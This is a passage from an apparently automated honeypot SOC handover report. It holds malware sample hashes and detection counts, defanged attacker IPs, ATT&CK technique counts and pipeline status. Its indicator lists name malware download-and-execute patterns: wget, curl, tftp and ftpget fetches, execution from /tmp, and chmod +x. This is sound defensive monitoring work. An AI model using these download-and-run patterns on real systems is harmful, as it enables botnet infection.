| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `112.161.26[.]125` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `158.178.141[.]210` | AU | Oracle Svenska AB | **100** ⚠️ | 2 |
| `218.95.73[.]31` | CN | CHINANET jiangxi province network | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `74.208.177[.]56` | US | IONOS Inc. | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `93.87.69[.]161` | RS | Raska-KOPAONIK  BB | **100** ⚠️ | 0 |
| `196.188.187[.]85` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `179.181.133[.]153` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 116 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 102 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 53 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 51 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 51 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 154 cases |
| Tool 34  | Credential Extractor        | ✅ 108 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 72 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 102 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-03T23:06:10Z_
